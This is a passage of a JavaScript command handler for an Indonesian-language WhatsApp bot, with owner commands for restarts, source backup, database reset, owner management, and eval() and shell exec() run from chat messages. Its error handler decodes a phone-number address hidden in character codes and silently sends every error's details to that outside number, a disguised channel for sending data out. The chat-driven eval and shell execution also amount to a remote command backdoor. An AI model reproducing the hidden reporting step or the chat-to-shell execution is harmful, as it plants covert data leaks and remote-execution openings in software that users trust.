await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz-V4`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await xyu.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
xyu.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
xyu.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
let urel = `https://pomf2.lain.la/f/7ixvc40h.mp3`
xyu.sendMessage(m.chat, {audio: {url: urel}, mimetype: 'audio/mpeg', ptt: true }, { quoted: m})
}


//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
xyu.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});